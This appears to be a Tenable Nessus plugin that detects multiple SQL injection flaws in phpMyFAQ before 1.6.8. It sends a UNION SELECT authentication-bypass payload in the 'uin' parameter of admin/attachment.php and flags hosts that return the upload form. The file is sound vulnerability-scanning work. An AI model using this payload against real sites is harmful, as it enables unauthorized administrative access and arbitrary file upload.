#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24001);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-6912", "CVE-2006-6913");
  script_bugtraq_id(21944, 21945);
  script_osvdb_id(32601, 32602);

  script_name(english:"phpMyFAQ < 1.6.8 Multiple SQL Injection Vulnerabilities");
  script_summary(english:"Checks for SQL injection in phpMyFAQ");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
several SQL injection issues." );
 script_set_attribute(attribute:"description", value:
"The version of phpMyFAQ on the remote host does not properly validate
input to the 'uin' parameter of several scripts before using it in
database queries.  An unauthenticated, remote attacker may be able to
leverage these issues to launch SQL injection attacks against the
affected application, even bypass authentication and upload arbitrary
files that can then be run on the affected host subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.phpmyfaq.de/advisory_2006-12-15.php" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyFAQ 1.6.8 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/01/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/12/15");
 script_cvs_date("$Date: 2012/09/10 21:39:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpmyfaq:phpmyfaq");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2012 Tenable Network Security, Inc.");

  script_dependencies("phpmyfaq_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpmyfaq");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpmyfaq"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # See if we can bypass authentication.
  exploit = string("1' UNION SELECT 'admin',", '"', SCRIPT_NAME, "' UNION SELECT 1,'admin',0,11111111111111111111111--", '"--');
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/admin/attachment.php?",
      "uin=", urlencode(str:exploit)));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we can.
  if (
    'type="hidden" name="MAX_FILE_SIZE"' >< res &&
    string('type="hidden" name="uin" value="', exploit) >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
